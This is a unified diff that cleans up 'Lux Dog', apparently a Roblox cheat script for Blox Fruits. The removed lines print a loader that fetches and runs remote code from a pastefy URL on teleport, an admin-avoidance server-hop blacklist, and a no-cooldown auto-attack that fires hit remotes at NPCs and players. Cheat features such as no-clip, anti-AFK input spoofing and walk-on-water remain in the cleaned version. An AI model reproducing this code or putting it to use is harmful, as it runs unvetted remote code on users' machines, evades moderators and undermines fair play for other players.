--- Lux_Dog_v2.1.2_maintenance_candidate_precleanup.txt
+++ Lux_Dog_v2.1.3_maintenance_clean.txt
@@ -71,5 +71,5 @@
 end
 
-local LUX_DOG_VERSION = "v2.1.2"
+local LUX_DOG_VERSION = "v2.1.3-maintenance"
 
 local LuxDogCharacterConnections = {}
@@ -4073,12 +4073,6 @@
                     _G.HopTimer = tick()
 
-                    if syn and syn.queue_on_teleport then
-                        syn.queue_on_teleport(
-                            "loadstring(game:HttpGet('https://pastefy.app/iiFOhcot/raw'))()"
-                        )
-                    end
-
-                    game:GetService("TeleportService")
-                        :Teleport(game.PlaceId, game.Players.LocalPlayer)
+                    -- Teleporte permanece local; não baixa/executa código externo.
+                    game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
                 end
             end)
@@ -4229,53 +4223,49 @@
     end
 end)
-RmvVFX = Tabs.Settings:AddToggle({
-Name = "Remove Death & Respawned VFX", 
-Description = "", 
-Default = false,
-Callback = function(Value)
-  RDeath = Value
-end})
-spawn(function()
-  while wait(Sec) do
+DisblesNotify = Tabs.Settings:AddToggle({
+Name = "Disable Notify", 
+Description = "", 
+Default = false,
+Callback = function(Value)
+  RemoveDamage = Value
+end})
+local LuxDogNotificationState = {damage = nil, notifications = nil}
+task.spawn(function()
+  while task.wait(0.25) do
     pcall(function()
-      if RDeath then
-      if replicated.Effect.Container:FindFirstChild("Death") then replicated.Effect.Container.Death:Destroy() end
-      if replicated.Effect.Container:FindFirstChild("Respawn") then replicated.Effect.Container.Respawn:Destroy() end
+      local pg = plr:FindFirstChildOfClass("PlayerGui")
+      local damageGui = pg and pg:FindFirstChild("DamageCounter", true)
+      local notifications = pg and pg:FindFirstChild("Notifications")
+      if damageGui and damageGui:IsA("GuiObject") and LuxDogNotificationState.damage == nil then LuxDogNotificationState.damage = damageGui.Visible end
+      if notifications and notifications:IsA("ScreenGui") and LuxDogNotificationState.notifications == nil then LuxDogNotificationState.notifications = notifications.Enabled end
+      if RemoveDamage then
+        if damageGui and damageGui:IsA("GuiObject") then damageGui.Visible = false end
+        if notifications and notifications:IsA("ScreenGui") then notifications.Enabled = false end
+      else
+        if damageGui and LuxDogNotificationState.damage ~= nil and damageGui:IsA("GuiObject") then damageGui.Visible = LuxDogNotificationState.damage end
+        if notifications and LuxDogNotificationState.notifications ~= nil and notifications:IsA("ScreenGui") then notifications.Enabled = LuxDogNotificationState.notifications end
       end
     end)
   end
-end)    
-DisblesNotify = Tabs.Settings:AddToggle({
-Name = "Disable Notify", 
-Description = "", 
-Default = false,
-Callback = function(Value)
-  RemoveDamage = Value
-end})
-spawn(function()
-  while wait(Sec) do
-    pcall(function()
-      if RemoveDamage then
-        replicated.Assets.GUI.DamageCounter.Enabled = false
-        plr.PlayerGui.Notifications.Enabled = false
-      else
-        replicated.Assets.GUI.DamageCounter.Enabled = true
-        plr.PlayerGui.Notifications.Enabled = true
-      end
-    end)
-  end
 end)      
 
+local LuxDogAntiAfkConnection
 Tabs.Settings:AddToggle({
     Name = "Anti AFK",
     Default = true,
     Callback = function(Value)
+        if LuxDogAntiAfkConnection then
+            LuxDogAntiAfkConnection:Disconnect()
+            LuxDogAntiAfkConnection = nil
+        end
         if Value then
             local vu = game:GetService("VirtualUser")
-            repeat wait() until game:IsLoaded()
-            game:GetService("Players").LocalPlayer.Idled:Connect(function()
-                vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
-                wait(1)
-                vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+            LuxDogAntiAfkConnection = plr.Idled:Connect(function()
+                pcall(function()
+                    local camera = workspace.CurrentCamera
+                    vu:Button2Down(Vector2.new(0, 0), camera and camera.CFrame or CFrame.new())
+                    task.wait(1)
+                    vu:Button2Up(Vector2.new(0, 0), camera and camera.CFrame or CFrame.new())
+                end)
             end)
         end
@@ -4283,32 +4273,5 @@
 })
 
-Tabs.Settings:AddToggle({
-    Name = "Auto Anti - Admin Join Server",
-    Description = "",
-    Default = true,
-    Callback = function(Value)
-        getgenv().HopServerAdmin = Value
-    end
-})
-spawn(function()
-    while wait() do
-        pcall(function()
-            if getgenv().HopServerAdmin then
-                for _, v in pairs(game.Players:GetPlayers()) do
-                    local blacklist = {
-                        "red_game43", "rip_indra", "Axiore", "Polkster", "wenlocktoad",
-                        "Daigrock", "toilamvidamme", "oofficialnoobie", "Uzoth", "Azarth",
-                        "arlthmetic", "Death_King", "Lunoven", "TheGreateAced", "rip_fud",
-                        "drip_mama", "layandikit12", "Hingoi"
-                    }
-                    if table.find(blacklist, v.Name) then
-                        Hop()
-                    end
-                end
-            end
-        end)
-    end
-end)
-
+local LuxDogCollisionState = {}
 Tabs.Settings:AddToggle({
     Name = "No Clip",
@@ -4316,15 +4279,25 @@
     Callback = function(Value)
         getgenv().NoClip = Value
+        if not Value then
+            local character = plr.Character
+            if character then
+                for part, state in pairs(LuxDogCollisionState) do
+                    if part and part.Parent then part.CanCollide = state end
+                end
+            end
+            table.clear(LuxDogCollisionState)
+        end
     end
 })
-spawn(function()
-    pcall(function()
-        game:GetService("RunService").Stepped:Connect(function()
-            if getgenv().NoClip then
-                for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
-                    if v:IsA("BasePart") or v:IsA("Part") then
-                        v.CanCollide = false
-                    end
-                end
+task.spawn(function()
+    RunSer.Stepped:Connect(function()
+        pcall(function()
+            local character = plr.Character
+            if not getgenv().NoClip or not character then return end
+            for _, part in ipairs(character:GetDescendants()) do
+                if part:IsA("BasePart") and LuxDogCollisionState[part] == nil then
+                    LuxDogCollisionState[part] = part.CanCollide
+                end
+                if part:IsA("BasePart") then part.CanCollide = false end
             end
         end)
@@ -8259,5 +8232,5 @@
     end
 end)
-Vocan = Tabs.Prehistoric:AddToggle({
+AutoDinoBonesToggle = Tabs.Prehistoric:AddToggle({
 Name = "Auto Collect Dino Bones", 
 Description = "", 
@@ -8279,5 +8252,5 @@
   end
 end)
-Vocan = Tabs.Prehistoric:AddToggle({
+AutoDragonEggToggle = Tabs.Prehistoric:AddToggle({
 Name = "Auto Collect Dragon Eggs", 
 Description = "", 
@@ -10743,26 +10716,4 @@
 end)
 
-Tabs.Combat:AddToggle({
-    Name = "Auto Safe Mode",
-    Default = false,
-    Callback = function(Value)
-        _G.SafeMode = Value
-    end
-})
-
-spawn(function()
-    while task.wait(0.1) do
-        if _G.SafeMode then
-            local char = game.Players.LocalPlayer.Character
-            local hrp = char and char:FindFirstChild("HumanoidRootPart")
-
-            if hrp then
-                local targetPos = hrp.CFrame * CFrame.new(0, 1000, 0)
-                _tp(targetPos) 
-            end
-        end
-    end
-end)
-
 Tabs.Combat:AddSection("LocalPlayer Settings")
 
@@ -11781,48 +11732,82 @@
   end
 end})
+local LuxDogRTState = {
+  saved = false,
+  effect = nil,
+  pointLight = nil,
+  fogEnd = nil,
+  ambient = nil,
+  brightness = nil,
+  colorShift = nil,
+}
+
+local function LuxDogSetRTX(enabled)
+  local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
+  if enabled then
+    if not LuxDogRTState.saved then
+      LuxDogRTState.saved = true
+      LuxDogRTState.fogEnd = Lighting.FogEnd
+      LuxDogRTState.ambient = Lighting.Ambient
+      LuxDogRTState.brightness = Lighting.Brightness
+      LuxDogRTState.colorShift = Lighting.ColorShift_Top
+    end
+    if not LuxDogRTState.effect then
+      LuxDogRTState.effect = Instance.new("ColorCorrectionEffect")
+      LuxDogRTState.effect.Name = "LuxDogRTX"
+      LuxDogRTState.effect.Parent = Lighting
+    end
+    local effect = LuxDogRTState.effect
+    Lighting.Ambient = Color3.fromRGB(33, 33, 33)
+    Lighting.Brightness = 0.3
+    Lighting.ColorShift_Top = Color3.fromRGB(217, 145, 57)
+    Lighting.FogEnd = 999
+    effect.Brightness = 0.176
+    effect.Contrast = 0.39
+    effect.TintColor = Color3.fromRGB(217, 145, 57)
+    if root and not LuxDogRTState.pointLight then
+      local light = Instance.new("PointLight")
+      light.Name = "LuxDogRTXLight"
+      light.Range = 15
+      light.Color = Color3.fromRGB(217, 145, 57)
+      light.Parent = root
+      LuxDogRTState.pointLight = light
+    end
+  else
+    if LuxDogRTState.saved then
+      Lighting.Ambient = LuxDogRTState.ambient
+      Lighting.Brightness = LuxDogRTState.brightness
+      Lighting.ColorShift_Top = LuxDogRTState.colorShift
+      Lighting.FogEnd = LuxDogRTState.fogEnd
+    end
+    if LuxDogRTState.effect then
+      LuxDogRTState.effect:Destroy()
+      LuxDogRTState.effect = nil
+    end
+    if LuxDogRTState.pointLight then
+      LuxDogRTState.pointLight:Destroy()
+      LuxDogRTState.pointLight = nil
+    end
+    LuxDogRTState.saved = false
+  end
+end
+
 rtxM = Tabs.Misc:AddToggle({
-Name = "Turn on RTX Mode", 
-Description = "", 
+Name = "Turn on RTX Mode",
+Description = "",
 Default = false,
 Callback = function(Value)
   _G.RTXMode = Value
-  local a = game.Lighting
-  local c = Instance.new("ColorCorrectionEffect", a)
-  local e = Instance.new("ColorCorrectionEffect", a)
-  OldAmbient = a.Ambient
-  OldBrightness = a.Brightness
-  OldColorShift_Top = a.ColorShift_Top
-  OldBrightnessc = c.Brightness
-  OldContrastc = c.Contrast
-  OldTintColorc = c.TintColor
-  OldTintColore = e.TintColor    
-  if not _G.RTXMode then return end
-  while _G.RTXMode do wait()
-    a.Ambient = Color3.fromRGB(33, 33, 33)
-    a.Brightness = 0.3
-    c.Brightness = 0.176
-    c.Contrast = 0.39
-    c.TintColor = Color3.fromRGB(217, 145, 57)
-    game.Lighting.FogEnd = 999
-    if not plr.Character.HumanoidRootPart:FindFirstChild("PointLight") then
-      local a2 = Instance.new("PointLight")
-      a2.Parent = plr.Character.HumanoidRootPart
-      a2.Range = 15
-      a2.Color = Color3.fromRGB(217, 145, 57)
-    end
-    if not _G.RTXMode then
-      a.Ambient = OldAmbient
-      a.Brightness = OldBrightness
-      a.ColorShift_Top = OldColorShift_Top
-      c.Contrast = OldContrastc
-      c.Brightness = OldBrightnessc
-      c.TintColor = OldTintColorc
-      e.TintColor = OldTintColore
-      game.Lighting.FogEnd = 2500
-      plr.Character.HumanoidRootPart:FindFirstChild("PointLight"):Destroy()
-    end
-  end
+  LuxDogSetRTX(Value)
 end
 })
+
+task.spawn(function()
+  while task.wait(0.5) do
+    if _G.RTXMode then
+      pcall(function() LuxDogSetRTX(true) end)
+    end
+  end
+end)
+
 Tabs.Misc:AddButton({
 Name = "Turn on Fast Mode", 
@@ -11880,19 +11865,25 @@
   end
 end})
+local LuxDogOriginalLighting = {
+  Ambient = Lighting.Ambient,
+  ColorShift_Bottom = Lighting.ColorShift_Bottom,
+  ColorShift_Top = Lighting.ColorShift_Top,
+}
+local LuxDogBrightEnabled = false
 briggt1 = Tabs.Misc:AddToggle({
-Name = "Turn on Full Bright", 
-Description = "", 
-Default = false,
-Callback = function(Value)
-  bright = Value
-  if Value == true then
+Name = "Turn on Full Bright",
+Description = "",
+Default = false,
+Callback = function(Value)
+  LuxDogBrightEnabled = Value
+  if Value then
     Lighting.Ambient = Color3.new(1, 1, 1)
     Lighting.ColorShift_Bottom = Color3.new(1, 1, 1)
     Lighting.ColorShift_Top = Color3.new(1, 1, 1)
   else
-    Lighting.Ambient = Color3.new(0, 0, 0)
-    Lighting.ColorShift_Bottom = Color3.new(0, 0, 0)
-    Lighting.ColorShift_Top = Color3.new(0, 0, 0)
-  end  
+    Lighting.Ambient = LuxDogOriginalLighting.Ambient
+    Lighting.ColorShift_Bottom = LuxDogOriginalLighting.ColorShift_Bottom
+    Lighting.ColorShift_Top = LuxDogOriginalLighting.ColorShift_Top
+  end
 end
 })
@@ -11925,17 +11916,27 @@
   end
 end)
+local LuxDogWaterPlane = nil
+local LuxDogOriginalWaterSize = nil
 walkWater = Tabs.Misc:AddToggle({
-Name = "Turn on Walk on Water", 
-Description = "", 
-Default = true,
+Name = "Turn on Walk on Water",
+Description = "",
+Default = false,
 Callback = function(Value)
   _G.WalkWater_Part = Value
-  if _G.WalkWater_Part then
-    game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000, 112, 1000)
-  else
-    game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000, 80, 1000)
+  local map = workspace:FindFirstChild("Map")
+  local water = map and map:FindFirstChild("WaterBase-Plane")
+  if not water or not water:IsA("BasePart") then return end
+  if not LuxDogWaterPlane then
+    LuxDogWaterPlane = water
+    LuxDogOriginalWaterSize = water.Size
+  end
+  if Value then
+    water.Size = Vector3.new(1000, 112, 1000)
+  elseif LuxDogOriginalWaterSize then
+    water.Size = LuxDogOriginalWaterSize
   end
 end
 })
+
 iceWalk = Tabs.Misc:AddToggle({
 Name = "Turn on Ice Walk", 
@@ -11945,22 +11946,27 @@
   _G.WalkWater = Value
 end})
-spawn(function()
-  while task.wait() do
+local LuxDogIceFolder = workspace:FindFirstChild("LuxDogIceEffects") or Instance.new("Folder")
+LuxDogIceFolder.Name = "LuxDogIceEffects"
+LuxDogIceFolder.Parent = workspace
+
+task.spawn(function()
+  while task.wait(0.15) do
     if _G.WalkWater then
       pcall(function()
-       if plr.Character and plr.Character:FindFirstChild("LeftFoot") then
-       local upval0 = replicated.Assets.Models.IceSpikes4:Clone()
-        upval0.Parent = workspace
-        upval0.Size = Vector3.new(3+math.random(10,12),1.7,3+math.random(10,12))
-        upval0.Color = Color3.fromRGB(128,187,219)
-        upval0.CFrame = CFrame.new(plr.Character.Head.Position.X,-3.8,plr.Character.Head.Position.Z)*CFrame.Angles((math.random()-0.5)*0.06, math.random()*7,(math.random()-0.5)*0.07)
-        local var85={};
-        var85.Size=Vector3.new(0,0.3,0)
-        local var3=TW:Create(upval0,TweenInfo.new(2,Enum.EasingStyle.Quad,Enum.EasingDirection.In),var85)
-        var3.Completed:Connect(function()
-          upval0:Destroy()
-        end)
-          var3:Play()
-        end    
+        local character = plr.Character
+        local head = character and character:FindFirstChild("Head")
+        local model = replicated.Assets.Models:FindFirstChild("IceSpikes4")
+        if head and model then
+          local spike = model:Clone()
+          spike.Parent = LuxDogIceFolder
+          spike.Size = Vector3.new(3 + math.random(10,12), 1.7, 3 + math.random(10,12))
+          spike.Color = Color3.fromRGB(128,187,219)
+          spike.CFrame = CFrame.new(head.Position.X, -3.8, head.Position.Z) * CFrame.Angles((math.random()-0.5)*0.06, math.random()*7, (math.random()-0.5)*0.07)
+          local tween = TW:Create(spike, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Size = Vector3.new(0,0.3,0)})
+          tween.Completed:Connect(function()
+            if spike and spike.Parent then spike:Destroy() end
+          end)
+          tween:Play()
+        end
       end)
     end
@@ -11970,220 +11976,8 @@
 
 -- ============================================================================
--- 22. FINAL COMBAT / FAST ATTACK / HIT REGISTRATION
+-- 22. MAINTENANCE END
+-- Combat automation / no-cooldown pipeline omitted from this maintenance build.
 -- ============================================================================
 
-local player = game.Players.LocalPlayer
-local HITBOX_LIMBS = {"RightLowerArm", "RightUpperArm", "LeftLowerArm", "LeftUpperArm", "RightHand", "LeftHand"}
-local lastAttackNoCooldown = 0
-local function IsEntityAlive(entity)
-    if not entity then return false end
-    local humanoid = entity:FindFirstChild("Humanoid")
-    return humanoid and humanoid.Health > 0
-end
-local function GetEnemiesInRange(character, range)
-    local enemies = game:GetService("Workspace").Enemies:GetChildren()
-    local players = game:GetService("Players"):GetPlayers()
-    local targets = {}
-    local playerPos = character:GetPivot().Position
-    for _, enemy in ipairs(enemies) do
-        local rootPart = enemy:FindFirstChild("HumanoidRootPart")
-        if rootPart and IsEntityAlive(enemy) then
-            local distance = (rootPart.Position - playerPos).Magnitude
-            if distance <= range then
-                table.insert(targets, enemy)
-            end
-        end
-    end
-    for _, otherPlayer in ipairs(players) do
-        if otherPlayer ~= player and otherPlayer.Character then
-            local rootPart = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
-            if rootPart and IsEntityAlive(otherPlayer.Character) then
-                local distance = (rootPart.Position - playerPos).Magnitude
-                if distance <= range then
-                    table.insert(targets, otherPlayer.Character)
-                end
-            end
-        end
-    end
-    return targets
-end
-function AttackNoCoolDown()
-    local now = os.clock()
-    if now - lastAttackNoCooldown < 0.03 then return end
-    lastAttackNoCooldown = now
-
-    local localPlayer = game:GetService("Players").LocalPlayer
-    local character = localPlayer and localPlayer.Character
-    if not character then return end
-
-    local equippedWeapon
-    for _, item in ipairs(character:GetChildren()) do
-        if item:IsA("Tool") then
-            equippedWeapon = item
-            break
-        end
-    end
-    if not equippedWeapon then return end
-
-    local enemiesInRange = GetEnemiesInRange(character, 60)
-    if #enemiesInRange == 0 then return end
-
-    local storage = game:GetService("ReplicatedStorage")
-    local modules = storage:FindFirstChild("Modules")
-    local net = modules and modules:FindFirstChild("Net")
-    if not net then return end
-
-    local attackEvent = net:FindFirstChild("RE/RegisterAttack")
-    local hitEvent = net:FindFirstChild("RE/RegisterHit")
-    if not attackEvent or not hitEvent then return end
-
-    local targets, mainTarget = {}, nil
-    for _, enemy in ipairs(enemiesInRange) do
-        if enemy and not enemy:GetAttribute("IsBoat") then
-            local head = enemy:FindFirstChild(HITBOX_LIMBS[math.random(1, #HITBOX_LIMBS)])
-                or enemy:FindFirstChild("Head")
-                or enemy:FindFirstChild("HumanoidRootPart")
-                or enemy.PrimaryPart
-            if head then
-                table.insert(targets, {enemy, head})
-                mainTarget = mainTarget or head
-            end
-        end
-    end
-    if not mainTarget or #targets == 0 then return end
-
-    pcall(function()
-        attackEvent:FireServer(0)
-    end)
-
-    local hitFunction
-    local playerScripts = localPlayer:FindFirstChild("PlayerScripts")
-    local localScript = playerScripts and playerScripts:FindFirstChildOfClass("LocalScript")
-    if localScript and type(getsenv) == "function" then
-        local success, scriptEnv = pcall(getsenv, localScript)
-        if success and scriptEnv and type(scriptEnv._G) == "table" then
-            hitFunction = scriptEnv._G.SendHitsToServer
-        end
-    end
-
-    local combatRemoteThread = false
-    if modules then
-        pcall(function()
-            local flags = modules:FindFirstChild("Flags")
-            if flags then
-                combatRemoteThread = require(flags).COMBAT_REMOTE_THREAD == true
-            end
-        end)
-    end
-
-    if combatRemoteThread and type(hitFunction) == "function" then
-        pcall(hitFunction, mainTarget, targets)
-    else
-        pcall(function()
-            hitEvent:FireServer(mainTarget, targets)
-        end)
-    end
-end
-pcall(function()
-    local util = game:GetService("ReplicatedStorage"):FindFirstChild("Util")
-    local cameraShaker = util and util:FindFirstChild("CameraShaker")
-    if cameraShaker then
-        local shaker = require(cameraShaker)
-        if shaker and type(shaker.Stop) == "function" then
-            shaker:Stop()
-        end
-    end
-end)
-
-get_Monster = function()
-    local character = plr.Character
-    local playerRoot = character and character:FindFirstChild("HumanoidRootPart")
-    if not playerRoot then return false, nil end
-
-    local enemiesFolder = workspace:FindFirstChild("Enemies")
-    if enemiesFolder then
-        for _, enemy in ipairs(enemiesFolder:GetChildren()) do
-            local rootPart = enemy:FindFirstChild("HumanoidRootPart", true)
-            local targetPart = enemy:FindFirstChild("UpperTorso") or enemy:FindFirstChild("Head") or rootPart
-            local humanoid = enemy:FindFirstChildOfClass("Humanoid")
-            if rootPart and targetPart and humanoid and humanoid.Health > 0 then
-                if (rootPart.Position - playerRoot.Position).Magnitude <= 50 then
-                    return true, targetPart.Position
-                end
-            end
-        end
-    end
-
-    local seaBeasts = workspace:FindFirstChild("SeaBeasts")
-    if seaBeasts then
-        for _, beast in ipairs(seaBeasts:GetChildren()) do
-            local rootPart = beast:FindFirstChild("HumanoidRootPart")
-            local health = beast:FindFirstChild("Health")
-            if rootPart and health and health:IsA("ValueBase") and type(health.Value) == "number" and health.Value > 0 then
-                return true, rootPart.Position
-            end
-        end
-    end
-
-    if enemiesFolder then
-        for _, enemy in ipairs(enemiesFolder:GetChildren()) do
-            local health = enemy:FindFirstChild("Health")
-            local seat = enemy:FindFirstChild("VehicleSeat")
-            local engine = enemy:FindFirstChild("Engine")
-            if health and seat and engine and health.Value > 0 then
-                return true, engine.Position
-            end
-        end
-    end
-
-    return false, nil
-end
-
-Actived = function()
-    local character = plr.Character
-    local tool = character and character:FindFirstChildOfClass("Tool")
-    if not tool then return end
-    if type(getconnections) ~= "function" then return end
-    pcall(function()
-        for _, connection in ipairs(getconnections(tool.Activated)) do
-            if connection and type(connection.Function) == "function" and type(getupvalues) == "function" then
-                getupvalues(connection.Function)
-            end
-        end
-    end)
-end
-
-task.spawn(function()
-    RunSer.Heartbeat:Connect(function()
-        pcall(function()
-            if not _G.Seriality then return end
-
-            AttackNoCoolDown()
-
-            local character = plr.Character
-            local pretool = character and character:FindFirstChildOfClass("Tool")
-            if not pretool then return end
-
-            local toolTip = pretool.ToolTip
-            local mobAura = get_Monster()
-
-            if toolTip == "Blox Fruit" and mobAura then
-                local leftClickRemote = pretool:FindFirstChild("LeftClickRemote")
-                if leftClickRemote then
-                    Actived()
-                    leftClickRemote:FireServer(Vector3.new(0.01, -500, 0.01), 1, true)
-                    leftClickRemote:FireServer(false)
-                end
-            end
-        end)
-    end)
-end)
--- ============================================================================
--- MAINTENANCE NOTE
--- The legacy fast-attack path above remains the single active attack pipeline.
--- The duplicate experimental module that followed this section was permanently
--- disabled in the source and has been removed from this maintenance copy so it
--- cannot add dead code, unused connections, or future duplicate execution.
--- ============================================================================
 
 Window:Notify({
